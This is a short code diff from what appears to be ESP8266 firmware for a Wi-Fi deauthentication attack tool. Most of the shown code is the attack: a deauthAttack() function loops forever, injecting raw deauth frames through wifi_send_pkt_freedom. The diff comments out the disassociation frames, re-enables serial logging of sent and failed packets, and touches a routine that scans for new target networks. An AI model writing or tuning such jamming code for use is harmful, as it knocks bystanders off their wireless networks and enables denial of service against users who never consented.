@@ -78,7 +78,7 @@ void deauthAttack() {
   while (true){
     sendPacket(deauthPkt, PACKET_SIZE, "Deauth\0");
     delay(5);
-    sendPacket(disassociatePkt, PACKET_SIZE, "Disassociate\0");
+    // sendPacket(disassociatePkt, PACKET_SIZE, "Disassociate\0");
     delay(5);
   }
 }
@@ -88,9 +88,9 @@ bool sendPacket(uint8_t* packet, uint8_t pktSize, char* pktType){
     int result = wifi_send_pkt_freedom(packet, pktSize, 0);
 
     if(result != 0){
-      //Serial.printf("%s PACKET FAILED: %d\n", pktType, result);
+      Serial.printf("%s PACKET FAILED: %d\n", pktType, result);
     }else{
-      //Serial.printf("%s PACKET SENT: %d\n", pktType, result);
+      Serial.printf("%s PACKET SENT: %d\n", pktType, result);
     }
     return result == 0;
 }
@@ -139,7 +139,6 @@ void findNewNetworks(){
         printf("All network slots filled. Restarting");
         restart();
         return;
-
       }
 
       Serial.println("\nNew Network found");
